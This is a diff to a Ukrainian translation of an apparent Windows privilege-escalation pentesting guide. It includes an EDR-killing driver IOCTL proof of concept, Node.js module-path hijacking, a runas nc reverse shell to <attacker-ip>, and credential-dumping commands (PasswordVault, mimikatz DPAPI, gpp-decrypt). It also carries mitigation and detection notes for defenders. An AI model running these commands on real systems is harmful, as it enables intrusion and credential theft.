+#### Зловживання відсутністю FILE_DEVICE_SECURE_OPEN в об’єктах пристроїв (LPE + EDR kill)
 
-Деякі підписані драйвери сторонніх розробників створюють свій device object із надійним SDDL через IoCreateDeviceSecure, але забувають встановити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли device відкривається через шлях, що містить додатковий компонент, завдяки чому будь-який непривілейований користувач може отримати handle, використовуючи namespace path на кшталт:
+Деякі підписані сторонні драйвери створюють об’єкт пристрою із суворим SDDL через IoCreateDeviceSecure, але забувають встановити FILE_DEVICE_SECURE_OPEN у DeviceCharacteristics. Без цього прапорця захищений DACL не застосовується, коли пристрій відкривається через шлях із додатковим компонентом, що дозволяє будь-якому непривілейованому користувачеві отримати handle, використовуючи namespace path на кшталт:<sup>[[14]](#references)</sup>
 
 - \\ .\\DeviceName\\anything
 - \\ .\\amsdk\\anyfile (з реального випадку)
 
-Після того як користувач може відкрити device, привілейовані IOCTL, які надає драйвер, можна використати для LPE і tampering. Приклади можливостей, які спостерігалися на практиці:
+Після того як користувач може відкрити пристрій, привілейованими IOCTL, які надає драйвер, можна зловживати для LPE і tampering. Приклади можливостей, що спостерігалися на практиці:
 - Повертати handles із повним доступом до довільних процесів (крадіжка токена / SYSTEM shell через DuplicateTokenEx/CreateProcessAsUser).
-- Необмежене raw disk read/write (offline tampering, persistence tricks під час завантаження).
-- Завершувати довільні процеси, зокрема Protected Process/Light (PP/PPL), що дає змогу виконувати AV/EDR kill із user land через kernel.
+- Необмежене raw disk read/write (offline tampering, tricks для persistence під час завантаження).
+- Завершувати довільні процеси, зокрема Protected Process/Light (PP/PPL), що дозволяє виконувати AV/EDR kill із user land через kernel.
 
-Мінімальний шаблон PoC (user mode):
+Мінімальний PoC pattern (user mode):
 ```c
 // Example based on a vulnerable antimalware driver
 #define IOCTL_REGISTER_PROCESS  0x80002010
@@ -833,21 +834,20 @@ DWORD target = /* PID to kill or open */;
 DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
 DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
 ```
-Заходи захисту для розробників
-- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об’єктів пристроїв, доступ до яких має бути обмежений за допомогою DACL.
-- Перевіряйте контекст caller для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом на завершення процесу або повернення handle.
-- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розглядайте brokered models замість прямого доступу до kernel privileges.
+Mitigations for developers
+- Завжди встановлюйте FILE_DEVICE_SECURE_OPEN під час створення об'єктів пристроїв, які мають бути обмежені за допомогою DACL.
+- Перевіряйте контекст виклику для привілейованих операцій. Додавайте перевірки PP/PPL перед дозволом на завершення процесу або повернення дескрипторів.
+- Обмежуйте IOCTL (маски доступу, METHOD_*, перевірка вхідних даних) і розглядайте brokered models замість прямих привілеїв ядра.
 
-Ідеї для виявлення для захисників
-- Відстежуйте відкриття підозрілих імен пристроїв із user-mode (наприклад, \\ .\\amsdk*) і конкретні послідовності IOCTL, що вказують на зловживання.
-- Забезпечте застосування Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) і підтримуйте власні списки дозволених/заборонених об’єктів.
-
+Detection ideas for defenders
+- Відстежуйте відкриття підозрілих імен пристроїв у user-mode (наприклад, \\ .\\amsdk*) і певні послідовності IOCTL, що вказують на зловживання.
+- Застосовуйте Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control) і підтримуйте власні списки дозволів/заборон.
 
 ## PATH DLL Hijacking
 
-Якщо у вас є **права на запис у папці, наявній у PATH**, ви можете перехопити DLL, завантажену процесом, і **підвищити привілеї**.
+Якщо у вас є **дозволи на запис у папку, наявну в PATH**, ви можете перехопити DLL, завантажену процесом, і **підвищити привілеї**.
 
-Перевірте дозволи для всіх папок у PATH:
+Перевірте дозволи всіх папок у PATH:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
@@ -858,44 +858,44 @@ for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F
 dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
 {{#endref}}
 
-## Hijacking resolution модулів Node.js / Electron через `C:\node_modules`
+## Перехоплення пошуку модулів Node.js / Electron через `C:\node_modules`
 
-Це варіант **Windows uncontrolled search path**, який впливає на застосунки **Node.js** і **Electron**, коли вони виконують bare import, наприклад `require("foo")`, а очікуваний модуль **відсутній**.
+Це варіант **Windows uncontrolled search path**, який впливає на застосунки **Node.js** і **Electron**, коли вони виконують bare import, наприклад `require("foo")`, а очікуваний модуль **відсутній**.<sup>[[20]](#references)</sup>
 
-Node визначає пакети, піднімаючись по дереву каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей обхід може досягти кореня диска, тому застосунок, запущений із `C:\Users\Administrator\project\app.js`, може зрештою перевіряти:
+Node шукає пакети, піднімаючись по дереву каталогів і перевіряючи папки `node_modules` у кожному батьківському каталозі. У Windows цей пошук може дійти до кореня диска, тому застосунок, запущений із `C:\Users\Administrator\project\app.js`, може зрештою перевіряти:<sup>[[21]](#references)</sup>
 
 1. `C:\Users\Administrator\project\node_modules\foo`
 2. `C:\Users\Administrator\node_modules\foo`
 3. `C:\Users\node_modules\foo`
 4. `C:\node_modules\foo`
 
-Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити шкідливий `foo.js` (або папку пакета) і чекати, доки **процес Node/Electron із вищими привілеями** спробує визначити відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тому це стає **LPE**, коли ціль запускається від імені адміністратора, з elevated scheduled task/service wrapper або як привілейований desktop app, що запускається автоматично.
+Якщо **користувач із низькими привілеями** може створити `C:\node_modules`, він може розмістити шкідливий `foo.js` (або папку пакета) і чекати, поки **процес Node/Electron із вищими привілеями** спробує розв'язати відсутню залежність. Payload виконується в контексті безпеки процесу-жертви, тому це стає **LPE**, якщо цільовий процес працює від імені адміністратора, із підвищених привілеїв у scheduled task/service wrapper або як auto-started privileged desktop app.
 
 Це особливо поширено, коли:
 
-- залежність оголошена в `optionalDependencies`
-- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу після помилки
-- пакет було видалено з production builds, пропущено під час пакування або його встановлення завершилося помилкою
-- вразливий `require()` знаходиться глибоко в дереві залежностей, а не в основному коді застосунку
+- залежність оголошена в `optionalDependencies`<sup>[[22]](#references)</sup>
+- стороння бібліотека обгортає `require("foo")` у `try/catch` і продовжує роботу у разі помилки
+- пакет було видалено з production-збірок, пропущено під час пакування або його не вдалося встановити
+- вразливий `require()` розташований глибоко всередині дерева залежностей, а не в основному коді застосунку
 
 ### Пошук вразливих цілей
 
-Використовуйте **Procmon**, щоб підтвердити шлях resolution:
+Використовуйте **Procmon**, щоб підтвердити шлях пошуку:<sup>[[23]](#references)</sup>
 
-- Встановіть фільтр `Process Name` = виконуваний файл цілі (`node.exe`, EXE-файл Electron app або wrapper process)
-- Встановіть фільтр `Path` `contains` `node_modules`
+- Фільтруйте за `Process Name` = виконуваний файл цілі (`node.exe`, EXE-файл застосунку Electron або процес wrapper
+- Фільтруйте за `Path` `contains` `node_modules`
 - Зосередьтеся на `NAME NOT FOUND` і фінальному успішному відкритті в `C:\node_modules`
 
-Корисні шаблони під час code review у розпакованих `.asar` файлах або вихідному коді застосунків:
+Корисні шаблони для code review у розпакованих файлах `.asar` або вихідному коді застосунку:
 ```bash
 rg -n 'require\\("[^./]' .
 rg -n "require\\('[^./]" .
 rg -n 'optionalDependencies' .
 rg -n 'try[[:space:]]*\\{[[:space:][:print:]]*require\\(' .
 ```
-### Exploitation
+### Експлуатація
 
-1. Визначте **назву відсутнього пакета** за допомогою Procmon або аналізу вихідного коду.
+1. Визначте **назву відсутнього пакета** за допомогою Procmon або під час аналізу вихідного коду.
 2. Створіть кореневий каталог пошуку, якщо він ще не існує:
 ```powershell
 mkdir C:\node_modules
@@ -908,19 +908,19 @@ module.exports = {}
 ```
 4. Запустіть застосунок-жертву. Якщо застосунок намагається виконати `require("foo")`, а легітимний модуль відсутній, Node може завантажити `C:\node_modules\foo.js`.
 
-Реальні приклади відсутніх опціональних модулів, що відповідають цьому шаблону, включають `bluebird` і `utf-8-validate`, але **техніка** є багаторазово застосовною частиною: знайдіть будь-який **відсутній bare import**, який привілейований процес Windows Node/Electron спробує розв’язати.
+Реальними прикладами відсутніх optional modules, що відповідають цьому шаблону, є `bluebird` і `utf-8-validate`, але **technique** є повторно використовуваною частиною: знайдіть будь-який **missing bare import**, який privileged Windows Node/Electron process спробує resolve.
 
 ### Ідеї для виявлення та hardening
 
-- Створюйте сповіщення, коли користувач створює `C:\node_modules` або записує туди нові `.js` файли/пакети.
-- Шукайте процеси з високим рівнем цілісності, які читають із `C:\node_modules\*`.
-- Додавайте всі runtime-залежності до production-збірки та перевіряйте використання `optionalDependencies`.
-- Перевіряйте сторонній код на наявність шаблонів `try { require("...") } catch {}`, що працюють безшумно.
-- Вимикайте опціональні перевірки, якщо бібліотека це підтримує (наприклад, деякі розгортання `ws` можуть уникнути legacy-перевірки `utf-8-validate` за допомогою `WS_NO_UTF_8_VALIDATE=1`).
+- Створюйте сповіщення, коли користувач створює `C:\node_modules` або записує туди нові `.js` файли/packages.
+- Шукайте high-integrity processes, які читають із `C:\node_modules\*`.
+- Додавайте всі runtime dependencies до production і перевіряйте використання `optionalDependencies`.
+- Перевіряйте third-party code на наявність тихих шаблонів `try { require("...") } catch {}`.
+- Вимикайте optional probes, якщо library це підтримує (наприклад, деякі `ws` deployments можуть уникнути legacy `utf-8-validate` probe за допомогою `WS_NO_UTF_8_VALIDATE=1`).
 
-## Мережа
+## Network
 
-### Спільні ресурси
+### Shares
 ```bash
 net view #Get a list of computers
 net view /all /domain [domainname] #Shares on the domains
@@ -928,7 +928,7 @@ net view \\computer /ALL #List shares of a computer
 net use x: \\computer\share #Mount the share locally
 net share #Check current shares
 ```
-### файл hosts
+### hosts file
 
 Перевірте наявність інших відомих комп’ютерів, жорстко заданих у файлі hosts
 ```
@@ -942,7 +942,7 @@ Get-DnsClientServerAddress -AddressFamily IPv4 | ft
 ```
 ### Відкриті порти
 
-Перевірте **обмежені служби** ззовні
+Перевірте **служби з обмеженим доступом** ззовні
 ```bash
 netstat -ano #Opened ports?
 ```
@@ -958,18 +958,18 @@ Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
 ```
 ### Правила брандмауера
 
-[**Перегляньте цю сторінку, щоб ознайомитися з командами, пов’язаними з брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**
+[**Перевірте цю сторінку щодо команд, пов’язаних із брандмауером**](../basic-cmd-for-pentesters.md#firewall) **(перегляд правил, створення правил, вимкнення, вимкнення...)**
 
-[Більше команд для мережевої розвідки тут](../basic-cmd-for-pentesters.md#network)
+Більше[ команд для мережевої розвідки тут](../basic-cmd-for-pentesters.md#network)
 
 ### Підсистема Windows для Linux (wsl)
 ```bash
 C:\Windows\System32\bash.exe
 C:\Windows\System32\wsl.exe
 ```
-Бінарний файл `bash.exe` також можна знайти за шляхом `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
+Бінарний файл `bash.exe` також можна знайти в `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`
 
-Якщо ви отримали root user, можна прослуховувати будь-який порт (під час першого використання `nc.exe` для прослуховування порту через GUI з’явиться запит, чи дозволити `nc` працювати через firewall).
+Якщо ви отримаєте root user, ви зможете прослуховувати будь-який порт (під час першого використання `nc.exe` для прослуховування порту через GUI буде запитано, чи слід дозволити `nc` роботу через firewall).
 ```bash
 wsl whoami
 ./ubuntun1604.exe config --default-user root
@@ -994,16 +994,16 @@ reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDef
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
 ```
-### Менеджер облікових даних / Windows Vault
+### Менеджер облікових даних / Windows vault
 
-З [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
-Windows Vault зберігає облікові дані користувачів для серверів, вебсайтів та інших програм, у які **Windows** може **автоматично входити від імені користувачів**. Спочатку може здатися, що тепер користувачі можуть зберігати свої облікові дані Facebook, Twitter, Gmail тощо, щоб автоматично входити через браузери. Але це не так.
+From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
+Windows Vault зберігає облікові дані користувачів для серверів, вебсайтів та інших програм, у які **Windows** може **автоматично входити від імені користувачів**. На перший погляд може здатися, що тепер користувачі можуть зберігати свої облікові дані Facebook, Twitter, Gmail тощо, щоб браузери автоматично виконували вхід. Але це не так.
 
-Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити від імені користувачів, тобто будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може використовувати цей Credential Manager** і застосовувати надані облікові дані замість того, щоб користувачі щоразу вводили ім’я користувача та пароль.
+Windows Vault зберігає облікові дані, за допомогою яких Windows може автоматично входити від імені користувачів. Це означає, що будь-яка **програма Windows, якій потрібні облікові дані для доступу до ресурсу** (сервера або вебсайту), **може використовувати цей Credential Manager** і Windows Vault, використовуючи надані облікові дані замість того, щоб користувачі щоразу вводили ім’я користувача та пароль.
 
-Якщо програми не взаємодіють із Credential Manager, я не думаю, що вони можуть використовувати облікові дані для певного ресурсу. Отже, якщо ваша програма хоче використовувати сховище, вона повинна певним чином **зв’язатися з credential manager і запросити облікові дані для цього ресурсу** зі сховища за замовчуванням.
+Якщо програми не взаємодіють із Credential Manager, я не думаю, що вони можуть використовувати облікові дані для певного ресурсу. Отже, якщо ваша програма хоче використовувати vault, вона повинна певним чином **взаємодіяти з менеджером облікових даних і запитувати облікові дані для цього ресурсу** зі сховища за замовчуванням.
 
-Використовуйте `cmdkey`, щоб переглянути збережені облікові дані на комп’ютері.
+Use the `cmdkey` to list the stored credentials on the machine.
 ```bash
 cmdkey /list
 Currently stored credentials:
@@ -1011,11 +1011,11 @@ Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
 ```
-Тоді ви можете використовувати `runas` з опцією `/savecred`, щоб скористатися збереженими обліковими даними. У наступному прикладі віддалений бінарний файл викликається через SMB-шару.
+Потім можна використовувати `runas` з параметром `/savecred`, щоб скористатися збереженими обліковими даними. У наведеному прикладі віддалений бінарний файл викликається через SMB-шару.
 ```bash
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 ```
-Використання `runas` із наданими обліковими даними.
+Використання `runas` із наданим набором облікових даних.
 ```bash
 C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
 ```
@@ -1023,26 +1023,26 @@ C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\us
 
 ### UWP PasswordVault / Credential Locker
 
-Сучасні Windows UWP-застосунки, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та plaintext-паролі всередині `PasswordVault` Universal Windows Platform (UWP) (також доступного як `Web Credentials` у `vaultcmd`). Це сховище ізольоване на рівні сесії, і його можна розшифрувати нативними засобами без адміністративних прав або прав `SeDebugPrivilege`.
+Сучасні UWP-застосунки Windows, Microsoft Edge і сучасні системні служби зберігають токени автентифікації та паролі у відкритому вигляді всередині Universal Windows Platform (UWP) `PasswordVault` (також доступний як `Web Credentials` у `vaultcmd`). Це сховище ізольоване на рівні сесії, і його можна розшифрувати нативними засобами без адміністративних прав або прав `SeDebugPrivilege`.
 
-Виконайте цю PowerShell-команду в активній сесії користувача, щоб миттєво виконати dump і decrypt усіх збережених імен користувачів і plaintext-паролів:
+Виконайте цю команду PowerShell в активній сесії користувача, щоб миттєво отримати та розшифрувати всі збережені імена користувачів і паролі у відкритому вигляді:
 ```ps1
 [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
 ```
 ### DPAPI
 
-**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, який переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрет користувача або системи для значного підвищення ентропії.
+**Data Protection API (DPAPI)** надає метод симетричного шифрування даних, що переважно використовується в операційній системі Windows для симетричного шифрування асиметричних приватних ключів. Це шифрування використовує секрет користувача або системи, який робить значний внесок в ентропію.
 
-**DPAPI уможливлює шифрування ключів за допомогою симетричного ключа, похідного від облікових даних користувача для входу**. У випадках системного шифрування використовуються секрети доменної автентифікації системи.
+**DPAPI забезпечує шифрування ключів за допомогою симетричного ключа, похідного від облікових даних користувача для входу**. У сценаріях, що передбачають системне шифрування, використовуються секрети доменної автентифікації системи.
 
-Зашифровані RSA-ключі користувача, зашифровані за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` позначає [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований разом із master key, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому його вміст неможливо переглянути за допомогою команди `dir` у CMD, хоча це можна зробити через PowerShell).
+Зашифровані RSA-ключі користувача, створені за допомогою DPAPI, зберігаються в каталозі `%APPDATA%\Microsoft\Protect\{SID}`, де `{SID}` позначає [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) користувача. **Ключ DPAPI, розташований разом із головним ключем, який захищає приватні ключі користувача в тому самому файлі**, зазвичай складається з 64 байтів випадкових даних. (Важливо зазначити, що доступ до цього каталогу обмежений, тому його вміст неможливо переглянути за допомогою команди `dir` у CMD, хоча його можна переглянути через PowerShell).
 ```bash
 Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
 ```
-Ви можете використовувати **mimikatz module** `dpapi::masterkey` із відповідними аргументами (`/pvk` або `/rpc`) для його розшифрування.
+Ви можете використовувати **модуль mimikatz** `dpapi::masterkey` із відповідними аргументами (`/pvk` або `/rpc`), щоб розшифрувати його.
 
-**Файли облікових даних, захищені головним паролем**, зазвичай розташовані в:
+**Файли облікових даних, захищені головним паролем,** зазвичай розташовані в:
 ```bash
 dir C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
@@ -1050,18 +1050,18 @@ Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
 Ви можете використати **mimikatz module** `dpapi::cred` із відповідним `/masterkey` для розшифрування.\
-Ви можете **extract many DPAPI** **masterkeys** із **пам'яті** за допомогою модуля `sekurlsa::dpapi` (якщо у вас є права root).
+Ви можете **extract багато DPAPI** **masterkeys** із **memory** за допомогою модуля `sekurlsa::dpapi` (якщо у вас є права root).
 
 
 {{#ref}}
 dpapi-extracting-passwords.md
 {{#endref}}
 
-### Облікові дані PowerShell
+### PowerShell Credentials
 
-**Облікові дані PowerShell** часто використовуються для **scripting** і завдань автоматизації як зручний спосіб зберігання зашифрованих облікових даних. Облікові дані захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим самим користувачем на тому самому комп'ютері, на якому їх було створено.
+**PowerShell credentials** часто використовуються для **scripting** та завдань автоматизації як зручний спосіб зберігання зашифрованих облікових даних. Облікові дані захищені за допомогою **DPAPI**, що зазвичай означає, що їх можна розшифрувати лише тим самим користувачем на тому самому комп’ютері, на якому їх було створено.
 
-Щоб **decrypt** облікові дані PS із файлу, який їх містить, можна виконати:
+Щоб **decrypt** PS credentials із файлу, що їх містить, можна виконати:
 ```bash
 PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
 PS C:\> $credential.GetNetworkCredential().username
@@ -1084,7 +1084,7 @@ cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| 
 ### Збережені RDP-підключення
 
 Їх можна знайти в `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
-та в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
+і в `HKCU\Software\Microsoft\Terminal Server Client\Servers\`
 
 ### Нещодавно виконані команди
 ```
@@ -1096,17 +1096,17 @@ HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
 %localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
 ```
 Використовуйте модуль **Mimikatz** `dpapi::rdg` із відповідним `/masterkey`, щоб **розшифрувати будь-які файли .rdg**\
-За допомогою модуля **Mimikatz** `sekurlsa::dpapi` можна **отримати багато DPAPI masterkeys** із пам’яті
+За допомогою модуля Mimikatz `sekurlsa::dpapi` можна **витягнути багато головних ключів DPAPI** з пам’яті
 
 ### Sticky Notes
 
-Користувачі часто використовують застосунок Sticky Notes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований за шляхом `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`, його завжди варто шукати та перевіряти.
+Користувачі часто використовують застосунок Sticky Notes на робочих станціях Windows, щоб **зберігати паролі** та іншу інформацію, не усвідомлюючи, що це файл бази даних. Цей файл розташований за адресою `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`, тому його завжди варто пошукати й перевірити.
 
 ### AppCmd.exe
 
-**Зверніть увагу, що для відновлення паролів із AppCmd.exe потрібно мати права Administrator і запустити його з рівнем High Integrity.**\
+**Зверніть увагу, що для відновлення паролів із AppCmd.exe потрібно мати права адміністратора та запускати його з рівнем High Integrity.**\
 **AppCmd.exe** розташований у каталозі `%systemroot%\system32\inetsrv\`.\
-Якщо цей файл існує, то, можливо, були налаштовані певні **облікові дані**, які можна **відновити**.
+Якщо цей файл існує, це може означати, що було налаштовано певні **облікові дані**, які можна **відновити**.
 
 Цей код було взято з [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
 ```bash
@@ -1197,31 +1197,31 @@ else { Write "Not Installed." }
 ```
 ## Файли та реєстр (облікові дані)
 
-### Облікові дані Putty
+### Putty Creds
 ```bash
 reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
 ```
-### Хост-ключі SSH у PuTTY
+### Ключі хостів Putty SSH
 ```
 reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
 ```
-### SSH-ключі в реєстрі
+### SSH keys у реєстрі
 
-Приватні SSH-ключі можуть зберігатися в ключі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тому перевірте, чи є там щось цікаве:
+Приватні SSH-ключі можуть зберігатися в ключі реєстру `HKCU\Software\OpenSSH\Agent\Keys`, тому слід перевірити, чи є там щось цікаве:
 ```bash
 reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
 ```
-Якщо ви знайдете будь-який запис у цьому шляху, найімовірніше, це буде збережений SSH key. Він зберігається у зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
-Більше інформації про цю техніку: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
+Якщо ви знайдете будь-який запис у цьому шляху, це, ймовірно, буде збережений SSH-ключ. Він зберігається в зашифрованому вигляді, але його можна легко розшифрувати за допомогою [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
+Більше інформації про цю техніку тут: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)
 
-Якщо сервіс `ssh-agent` не запущений і ви хочете, щоб він автоматично запускався під час завантаження, виконайте:
+Якщо служба `ssh-agent` не запущена і ви хочете, щоб вона автоматично запускалася під час завантаження системи, виконайте:
 ```bash
 Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
 ```
 > [!TIP]
-> Схоже, що ця техніка більше не є актуальною. Я спробував створити кілька ssh keys, додати їх за допомогою `ssh-add` і виконати вхід через ssh на машину. Реєстр HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час асиметричної автентифікації ключа.
+> Схоже, що ця техніка більше не є актуальною. Я спробував створити кілька ssh keys, додати їх за допомогою `ssh-add` і увійти через ssh на машину. Реєстр HKCU\Software\OpenSSH\Agent\Keys не існує, а procmon не виявив використання `dpapi.dll` під час автентифікації за допомогою асиметричного ключа.
 
-### Файли unattended
+### Файли автоматичного встановлення
 ```
 C:\Windows\sysprep\sysprep.xml
 C:\Windows\sysprep\sysprep.inf
@@ -1236,7 +1236,7 @@ C:\unattend.txt
 C:\unattend.inf
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 ```
-Також можна шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_
+Ви також можете шукати ці файли за допомогою **metasploit**: _post/windows/gather/enum_unattend_
 
 Приклад вмісту:
 ```xml
@@ -1281,13 +1281,13 @@ AppData\Roaming\gcloud\access_tokens.db
 
 Знайдіть файл із назвою **SiteList.xml**
 
-### Cached GPP Password
+### Кешований пароль GPP
 
-Раніше була доступна функція, яка дозволяла розгортати власні локальні облікові записи адміністратора на групі комп’ютерів через Group Policy Preferences (GPP). Однак цей метод мав значні недоліки безпеки. По-перше, Group Policy Objects (GPOs), що зберігалися як XML-файли в SYSVOL, могли бути доступними будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 із використанням загальнодоступного ключа за замовчуванням, могли бути розшифровані будь-яким автентифікованим користувачем. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.
+Раніше була доступна функція, яка дозволяла розгортати власні локальні облікові записи адміністраторів на групі машин через Group Policy Preferences (GPP). Однак цей метод мав суттєві проблеми з безпекою. По-перше, Group Policy Objects (GPO), що зберігалися у вигляді XML-файлів у SYSVOL, могли бути доступні будь-якому користувачу домену. По-друге, паролі в цих GPP, зашифровані за допомогою AES256 із використанням загальнодоступного задокументованого ключа за замовчуванням, могли бути розшифровані будь-яким автентифікованим користувачем. Це становило серйозний ризик, оскільки могло дозволити користувачам отримати підвищені привілеї.
 
-Для зменшення цього ризику було розроблено функцію, яка виконує пошук локально кешованих GPP-файлів, що містять непорожнє поле "cpassword". У разі виявлення такого файлу функція розшифровує пароль і повертає власний об’єкт PowerShell. Цей об’єкт містить відомості про GPP і розташування файлу, допомагаючи виявити та усунути цю вразливість безпеки.
+Для зменшення цього ризику було розроблено функцію, яка сканує локально кешовані файли GPP, що містять непорожнє поле "cpassword". У разі виявлення такого файлу функція розшифровує пароль і повертає власний об'єкт PowerShell. Цей об'єкт містить відомості про GPP і розташування файлу, що допомагає виявити та усунути цю вразливість системи безпеки.
 
-Виконайте пошук у `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до W Vista)_ таких файлів:
+Здійсніть пошук у `C:\ProgramData\Microsoft\Group Policy\history` або в _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (до W Vista)_ таких файлів:
 
 - Groups.xml
 - Services.xml
@@ -1296,7 +1296,7 @@ AppData\Roaming\gcloud\access_tokens.db
 - Printers.xml
 - Drives.xml
 
-**Щоб розшифрувати cPassword:**
+**Для розшифрування cPassword:**
 ```bash
 #To decrypt these passwords you can decrypt it using
 gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
@@ -1305,7 +1305,7 @@ gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
 ```bash
 crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
 ```
-### Веб-конфігурація IIS
+### Вебконфігурація IIS
 ```bash
 Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
 ```
@@ -1350,7 +1350,7 @@ $entropy,
 Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
 }
 ```
-### Логи
+### Журнали
 ```bash
 # IIS
 C:\inetpub\logs\LogFiles\*
@@ -1360,7 +1360,7 @@ Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAct
 ```
 ### Запит облікових даних
 
